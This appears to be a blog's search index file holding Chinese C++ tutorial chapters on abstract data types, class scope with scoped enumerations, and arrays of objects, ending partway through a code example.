<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>10.7 抽象数据类型</title>
      <link href="2025/04/26/10.7_%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>2025/04/26/10.7_%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>我们在本章中学习的类是 C++ 实现<strong>抽象数据类型 (Abstract Data Type, ADT)</strong> 的一种方式。ADT 是一种计算机科学的概念，它是一种<strong>数学模型</strong>，用于描述具有特定行为（语义）的数据类型，重点在于<strong>可以对数据执行的操作</strong>，而不是这些操作的具体实现方式或数据的内部表示。</p><p><strong>ADT 的核心思想:</strong></p><ol><li> <strong>数据封装:</strong> ADT 将数据以及对这些数据进行操作的函数捆绑在一起。</li><li> <strong>接口与实现分离:</strong> ADT 定义了一个<strong>公共接口 (Interface)**，即一组可以对数据执行的操作。用户通过这个接口与数据交互，而不需要知道数据是如何存储的，或者操作是如何实现的（</strong>实现细节隐藏**）。</li></ol><p>可以把 ADT 想象成一个“黑盒子”。你知道你可以给这个盒子提供什么输入（通过接口调用操作），以及你会得到什么输出或结果，但你不需要（也不能）看到盒子内部的构造。</p><p><strong>与内置类型的类比:</strong></p><p>想想 C++ 的内置类型 <code>int</code>。</p><ul><li>  <strong>数据:</strong> 它可以表示整数。</li><li>  <strong>操作:</strong> 你可以对 <code>int</code> 执行加、减、乘、除、比较等操作。</li><li>  <strong>抽象:</strong> 你使用这些操作时，并不需要关心 <code>int</code> 在内存中是如何用二进制位表示的，或者加法操作在 CPU 层面是如何执行的。你只关心操作的<strong>效果</strong>。</li></ul><p>ADT 将这种思想扩展到了用户自定义的数据类型。</p><p><strong>C++ 类如何实现 ADT:</strong></p><p>C++ 类天然地支持 ADT 的概念：</p><ul><li>  <strong>数据表示:</strong> 类的数据成员（通常是 <code>private</code>）用于存储 ADT 的数据。</li><li>  <strong>操作接口:</strong> 类的公有成员函数（<code>public</code> methods）定义了 ADT 的公共接口，即允许外部代码执行的操作。</li><li>  <strong>实现隐藏:</strong> 将数据成员设为 <code>private</code>，并将实现细节（如私有辅助函数、成员函数的具体代码）与接口（类定义中的公有声明）分离，实现了数据隐藏和封装。</li></ul><p><strong>以 <code>Stock</code> 类为例:</strong></p><p>我们可以将 <code>Stock</code> 类视为一个“股票持有” ADT。</p><ul><li>  <strong>ADT 描述:</strong> 一个表示某公司股票持有情况的类型。</li><li>  <strong>数据 (概念上):</strong> 公司名称、持有股数、当前股价、总价值。</li><li><strong>操作 (接口):</strong><ul><li>  创建一个股票持有记录（构造函数）。</li><li>  买入指定数量的股票（<code>buy</code> 方法）。</li><li>  卖出指定数量的股票（<code>sell</code> 方法）。</li><li>  更新股票价格（<code>update</code> 方法）。</li><li>  显示股票持有信息（<code>show</code> 方法）。</li><li>  (可能还有) 获取总价值、获取公司名称等。</li></ul></li><li><strong>实现 (隐藏细节):</strong><ul><li>  数据成员 <code>company</code>, <code>shares</code>, <code>share_val</code>, <code>total_val</code> 的具体类型（<code>std::string</code>, <code>long</code>, <code>double</code>）。</li><li>  私有辅助函数 <code>set_tot()</code> 的存在及其实现。</li><li>  <code>buy</code>, <code>sell</code>, <code>update</code>, <code>show</code> 等函数的具体代码逻辑。</li></ul></li></ul><p>使用 <code>Stock</code> 类的程序员（客户端代码）只需要了解其公共接口（<code>public</code> 方法）。他们可以创建 <code>Stock</code> 对象，调用 <code>buy()</code>, <code>sell()</code>, <code>show()</code> 等方法来完成任务，而无需关心 <code>total_val</code> 是如何计算和更新的，或者 <code>company</code> 是用 <code>std::string</code> 还是 C 风格字符串存储的。如果类的设计者决定改变内部实现（例如，优化 <code>set_tot</code> 的计算），只要公共接口保持不变，客户端代码就无需修改。</p><p><strong>ADT 的好处:</strong></p><ul><li>  <strong>抽象:</strong> 简化复杂性，让用户关注“做什么”而非“怎么做”。</li><li>  <strong>封装:</strong> 保护数据不被意外破坏，隐藏实现细节。</li><li>  <strong>模块化:</strong> 将程序分解为独立的、功能明确的单元（类/ADT）。</li><li>  <strong>可维护性:</strong> 修改一个 ADT 的内部实现不会影响使用该 ADT 的其他代码（只要接口不变）。</li><li>  <strong>可重用性:</strong> 设计良好的 ADT 可以在不同的程序中重复使用。</li></ul><p>因此，在设计 C++ 类时，以 ADT 的思维方式进行思考——明确这个类代表什么概念，它应该提供哪些操作（公共接口），以及需要隐藏哪些内部细节——是非常有益的。这有助于创建出结构清晰、易于使用和维护的代码。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10.6 类作用域</title>
      <link href="2025/04/26/10.6_%E7%B1%BB%E4%BD%9C%E7%94%A8%E5%9F%9F/"/>
      <url>2025/04/26/10.6_%E7%B1%BB%E4%BD%9C%E7%94%A8%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<p>我们已经知道，在函数内部或代码块内部定义的变量具有局部作用域（块作用域）。类似地，在类中定义的名称（数据成员、成员函数、嵌套类型、枚举等）也有其特定的作用域，称为**类作用域 (Class Scope)**。</p><p><strong>类作用域的规则:</strong></p><ol><li> <strong>内部可见性:</strong> 在类声明或成员函数定义内部，可以直接访问类的成员（数据成员、成员函数、枚举等），无需特殊限定。</li><li> <strong>外部访问限制:</strong> 在类的外部，不能直接访问类的成员。必须通过对象（使用点号 <code>.</code> 或箭头 <code>-&gt;</code>）或者通过类名和作用域解析运算符 <code>::</code>（对于静态成员、嵌套类型或枚举）来访问。</li><li> <strong>名称隔离:</strong> 类作用域意味着在一个类内部定义的名称不会与在另一个类或全局作用域中定义的同名名称冲突。例如，两个不同的类可以都有一个名为 <code>count</code> 的数据成员。</li></ol><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassA</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> count; <span class="comment">// ClassA 的 count</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123; value = <span class="number">10</span>; &#125; <span class="comment">// 可以直接访问 value</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value; <span class="comment">// ClassA 的 value</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">double</span> count; <span class="comment">// ClassB 的 count (与 ClassA::count 不冲突)</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">calculate</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_count = <span class="number">100</span>; <span class="comment">// 全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ClassA objA;</span><br><span class="line">    ClassB objB;</span><br><span class="line"></span><br><span class="line">    objA.count = <span class="number">1</span>; <span class="comment">// 访问 ClassA 对象的 count 成员</span></span><br><span class="line">    objB.count = <span class="number">2.5</span>; <span class="comment">// 访问 ClassB 对象的 count 成员</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误！不能直接访问类内部的名称</span></span><br><span class="line">    <span class="comment">// count = 5; // 访问哪个 count？ </span></span><br><span class="line">    <span class="comment">// value = 20; // 错误！value 在类作用域内</span></span><br><span class="line"></span><br><span class="line">    objA.process(); <span class="comment">// 通过对象调用成员函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>作用域解析运算符 <code>::</code></strong></p><p>当我们需要在类外部引用类作用域内的名称时（例如，在定义成员函数或访问静态成员时），就需要使用类名和作用域解析运算符 <code>::</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在类外部定义成员函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClassA::process</span><span class="params">()</span> </span>&#123; <span class="comment">// 使用 ClassA:: 指明 process 属于 ClassA</span></span><br><span class="line">    value = <span class="number">10</span>; <span class="comment">// 在成员函数内部，可以直接访问其他成员</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;count = <span class="number">5</span>; <span class="comment">// 也可以显式使用 this</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-6-1-作用域为类的常量"><a href="#10-6-1-作用域为类的常量" class="headerlink" title="10.6.1 作用域为类的常量"></a>10.6.1 作用域为类的常量</h2><p>有时，我们希望在类中定义一个常量，这个常量对于该类的所有对象来说都是一样的，并且可能在编译时就需要知道它的值（例如，用于指定数组大小）。</p><p>有几种方法可以在类作用域内创建常量：</p><ol><li><p><strong><code>static const</code> 成员 (整型或枚举类型 - C++11 前常用):</strong><br> 对于整型（<code>int</code>, <code>char</code>, <code>bool</code> 等）或枚举类型的常量，可以在类定义内部使用 <code>static const</code> 直接初始化。<code>static</code> 意味着这个常量属于类本身，而不是任何特定对象（所有对象共享同一个常量），<code>const</code> 意味着它的值不能被修改。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bakery</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 这个常量属于类，所有对象共享</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> Months = <span class="number">12</span>; <span class="comment">// 声明并初始化静态常量成员</span></span><br><span class="line">    <span class="keyword">double</span> costs[Months];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：如果需要在类外部获取该常量的地址，</span></span><br><span class="line"><span class="comment">// 或者编译器要求（较旧的编译器可能需要），</span></span><br><span class="line"><span class="comment">// 可能还需要在源文件中提供一个定义（不带初始值）：</span></span><br><span class="line"><span class="comment">// const int Bakery::Months; // 可选的定义</span></span><br></pre></td></tr></table></figure><p> 这种方式不能用于初始化非整型或非枚举类型的静态常量。</p></li><li><p><strong><code>static constexpr</code> 成员 (C++11 及以后):</strong><br> C++11 引入了 <code>constexpr</code>，它允许在编译时计算常量表达式。使用 <code>static constexpr</code> 可以定义各种类型的类作用域常量，只要初始化表达式是常量表达式即可。这是现代 C++ 中定义类常量的推荐方式。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">int</span> MaxUsers = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">double</span> Rate = <span class="number">1.5</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">const</span> <span class="keyword">char</span>* DefaultMsg = <span class="string">&quot;Welcome&quot;</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> userLimit = Config::MaxUsers; <span class="comment">// 直接使用类名访问</span></span><br><span class="line">    <span class="keyword">double</span> currentRate = Config::Rate;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>static constexpr</code> 成员默认是内联的，通常不需要在类外部再次定义。</p></li><li><p><strong>枚举技巧 (Enum Hack - C++11 前的变通方法):</strong><br> 在 C++11 之前，如果想在类中定义一个非整型的常量（或者只是想避免 <code>static const</code> 可能需要的外部定义），有时会使用匿名枚举。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LegacyBox</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> MaxSize = <span class="number">100</span> &#125;; <span class="comment">// 枚举技巧</span></span><br><span class="line">    <span class="keyword">int</span> items[MaxSize]; <span class="comment">// 使用枚举量作为数组大小</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p> <code>MaxSize</code> 就像一个值为 100 的整型常量，但它是一个枚举量。这种方法现在已不常用，<code>static constexpr</code> 是更好的选择。</p></li></ol><h2 id="10-6-2-作用域内枚举-Scoped-Enumerations-C-11"><a href="#10-6-2-作用域内枚举-Scoped-Enumerations-C-11" class="headerlink" title="10.6.2 作用域内枚举 (Scoped Enumerations - C++11)"></a>10.6.2 作用域内枚举 (Scoped Enumerations - C++11)</h2><p>传统的 C++ 枚举（<code>enum</code>）存在一些问题：</p><ul><li>  <strong>名称冲突:</strong> 枚举量（enumerators）被放置在与枚举定义相同的作用域中，容易与其他名称（包括其他枚举的枚举量）发生冲突。</li><li>  <strong>隐式转换:</strong> 枚举量可以隐式地转换为整型，有时这可能导致逻辑错误或降低类型安全性。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">OldColor</span> &#123;</span> RED, GREEN, BLUE &#125;;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">StopLight</span> &#123;</span> RED, YELLOW, GREEN &#125;; <span class="comment">// 错误！RED 和 GREEN 重定义</span></span><br><span class="line"></span><br><span class="line">OldColor myColor = RED; <span class="comment">// OK</span></span><br><span class="line"><span class="keyword">int</span> colorValue = myColor; <span class="comment">// OK, 隐式转换为 int (值为 0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (myColor == <span class="number">0</span>) &#123; <span class="comment">/* ... */</span> &#125; <span class="comment">// 可以和整数比较</span></span><br></pre></td></tr></table></figure><p>为了解决这些问题，C++11 引入了**作用域内枚举 (Scoped Enumerations)**，使用 <code>enum class</code> 或 <code>enum struct</code> 关键字定义。</p><p><strong>特点:</strong></p><ol><li> <strong>作用域限制:</strong> 枚举量的作用域被限制在枚举本身内部。访问枚举量必须使用枚举名称和作用域解析运算符 <code>::</code>。</li><li> <strong>无隐式转换:</strong> 作用域内枚举类型不能隐式地转换为整型或其他类型。如果需要转换，必须使用显式类型转换（如 <code>static_cast</code>）。</li><li> <strong>类型安全:</strong> 增强了类型安全性，不同作用域枚举类型的值不能直接比较（除非重载了比较运算符）。</li><li> <strong>可指定底层类型:</strong> 可以显式指定枚举使用的底层整数类型（默认为 <code>int</code>）。</li></ol><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">EnumName</span> :</span> UnderlyingType &#123; Enumerator1, Enumerator2, ... &#125;;</span><br><span class="line"><span class="comment">// 或者 enum struct (功能相同)</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">struct</span> <span class="title">EnumName</span> :</span> UnderlyingType &#123; Enumerator1, Enumerator2, ... &#125;;</span><br><span class="line"><span class="comment">// : UnderlyingType 是可选的</span></span><br></pre></td></tr></table></figure><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 enum class 定义作用域内枚举</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Color</span> :</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> &#123; <span class="comment">// 指定底层类型为 unsigned char</span></span><br><span class="line">    RED,    <span class="comment">// Color::RED</span></span><br><span class="line">    GREEN,  <span class="comment">// Color::GREEN</span></span><br><span class="line">    BLUE    <span class="comment">// Color::BLUE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">TrafficLight</span> &#123;</span></span><br><span class="line">    RED,    <span class="comment">// TrafficLight::RED (与 Color::RED 不冲突)</span></span><br><span class="line">    YELLOW,</span><br><span class="line">    GREEN</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Color myColor = Color::RED; <span class="comment">// 必须使用作用域解析符</span></span><br><span class="line">    TrafficLight light = TrafficLight::GREEN;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误！枚举量不在当前作用域</span></span><br><span class="line">    <span class="comment">// Color anotherColor = RED;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误！不能隐式转换为 int</span></span><br><span class="line">    <span class="comment">// int colorCode = myColor;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要显式转换</span></span><br><span class="line">    <span class="keyword">int</span> colorCode = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(myColor);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> underlyingValue = <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">char</span>&gt;(myColor);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Color code: &quot;</span> &lt;&lt; colorCode &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Underlying value: &quot;</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(underlyingValue) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0 (需要再次转换才能打印为数字)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误！不同枚举类型不能直接比较</span></span><br><span class="line">    <span class="comment">// if (myColor == light) &#123; /* ... */ &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以与相同类型的枚举量比较</span></span><br><span class="line">    <span class="keyword">if</span> (myColor == Color::RED) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The color is red.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (light == TrafficLight::GREEN) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The light is green.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>作用域内枚举是现代 C++ 中定义枚举类型的首选方式，因为它更安全、更不容易出错，并且避免了名称污染。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>  类成员（数据、函数、类型、常量、枚举）具有<strong>类作用域</strong>。</li><li>  在类外部访问类成员需要通过对象（<code>.</code> 或 <code>-&gt;</code>）或类名（<code>::</code>）。</li><li>  类作用域可以隔离名称，防止与全局或其他类中的名称冲突。</li><li>  可以使用 <code>static const</code> (整型/枚举) 或 <code>static constexpr</code> (C++11, 推荐) 在类内部定义常量。</li><li>  C++11 引入了**作用域内枚举 (<code>enum class</code> 或 <code>enum struct</code>)**，其枚举量作用域限制在枚举内，且不能隐式转换为整型，提高了代码的安全性和清晰度。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10.5 对象数组</title>
      <link href="2025/04/26/10.5_%E5%AF%B9%E8%B1%A1%E6%95%B0%E7%BB%84/"/>
      <url>2025/04/26/10.5_%E5%AF%B9%E8%B1%A1%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p>就像可以创建 <code>int</code>、<code>double</code> 或 <code>char</code> 的数组一样，你也可以创建<strong>类对象</strong>的数组。数组的每个元素都是一个该类的对象。</p><h2 id="声明对象数组"><a href="#声明对象数组" class="headerlink" title="声明对象数组"></a>声明对象数组</h2><p>声明对象数组的语法与声明基本类型数组类似：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassName arrayName[numberOfElements];</span><br></pre></td></tr></table></figure><p>例如，要创建一个包含 4 个 <code>Stock</code> 对象的数组：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span> <span class="comment">// 假设 Stock 类定义在此</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> STKS = <span class="number">4</span>;</span><br><span class="line">Stock myStocks[STKS]; <span class="comment">// 创建一个包含 4 个 Stock 对象的数组</span></span><br></pre></td></tr></table></figure><h2 id="构造函数的调用"><a href="#构造函数的调用" class="headerlink" title="构造函数的调用"></a>构造函数的调用</h2><p>当程序创建对象数组时，它需要为数组中的<strong>每个元素（对象）</strong>调用构造函数。</p><ul><li><p><strong>默认构造函数:</strong> 如果在声明数组时<strong>没有</strong>为元素提供显式的初始化值，程序将为数组中的<strong>每个元素</strong>调用类的**默认构造函数 (Default Constructor)**。</p><ul><li>  在上面的例子 <code>Stock myStocks[STKS];</code> 中，<code>Stock::Stock()</code> 这个默认构造函数将被调用 4 次，为 <code>myStocks[0]</code>, <code>myStocks[1]</code>, <code>myStocks[2]</code>, <code>myStocks[3]</code> 这四个对象进行初始化。</li><li>  <strong>重要:</strong> 如果类<strong>没有</strong>默认构造函数（例如，你只定义了带参数的构造函数，而没有定义无参数的构造函数或使用 <code>= default</code>），那么尝试创建像 <code>Stock myStocks[STKS];</code> 这样的未初始化数组将导致<strong>编译错误</strong>。</li></ul></li><li><p><strong>带参数的构造函数:</strong> 你可以在声明数组时使用初始化列表来为数组元素指定不同的构造函数调用。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> STKS = <span class="number">2</span>;</span><br><span class="line">Stock portfolio[STKS] = &#123;</span><br><span class="line">    Stock(<span class="string">&quot;NanoSmart&quot;</span>, <span class="number">12</span>, <span class="number">20.0</span>), <span class="comment">// 调用 Stock(const string&amp;, long, double)</span></span><br><span class="line">    Stock(<span class="string">&quot;Boffo Objects&quot;</span>, <span class="number">200</span>, <span class="number">2.0</span>) <span class="comment">// 调用 Stock(const string&amp;, long, double)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C++11 及以后版本可以使用更简洁的列表初始化</span></span><br><span class="line">Stock investments[] = &#123; <span class="comment">// 编译器会自动计算数组大小 (3)</span></span><br><span class="line">    Stock(<span class="string">&quot;Fleep Co&quot;</span>, <span class="number">5</span>, <span class="number">15.5</span>),</span><br><span class="line">    Stock(), <span class="comment">// 调用默认构造函数 Stock()</span></span><br><span class="line">    Stock(<span class="string">&quot;MacroHard&quot;</span>, <span class="number">18</span>, <span class="number">75.0</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>  在 <code>portfolio</code> 数组的例子中，<code>portfolio[0]</code> 使用提供的参数调用 <code>Stock(const string&amp;, long, double)</code> 构造函数，<code>portfolio[1]</code> 也一样。</p></li><li><p>  在 <code>investments</code> 数组的例子中，<code>investments[0]</code> 和 <code>investments[2]</code> 调用带参数的构造函数，而 <code>investments[1]</code> 则显式调用了默认构造函数 <code>Stock()</code>。</p></li><li><p>如果初始化列表提供的初始值数量<strong>少于</strong>数组大小，则剩余的元素将使用<strong>默认构造函数</strong>进行初始化。如果类没有默认构造函数，这将导致编译错误。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Stock funds[<span class="number">4</span>] = &#123;</span><br><span class="line">    Stock(<span class="string">&quot;A Corp&quot;</span>, <span class="number">10</span>, <span class="number">1.0</span>),</span><br><span class="line">    Stock(<span class="string">&quot;B Ltd&quot;</span>, <span class="number">20</span>, <span class="number">2.0</span>)</span><br><span class="line">    <span class="comment">// funds[2] 和 funds[3] 将使用默认构造函数 Stock() 初始化</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="访问对象数组成员"><a href="#访问对象数组成员" class="headerlink" title="访问对象数组成员"></a>访问对象数组成员</h2><p>访问数组中对象的成员与访问基本类型数组元素类似，先用索引 <code>[]</code> 选择数组中的特定对象，然后使用点号 <code>.</code> 访问该对象的公有成员（数据或函数）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 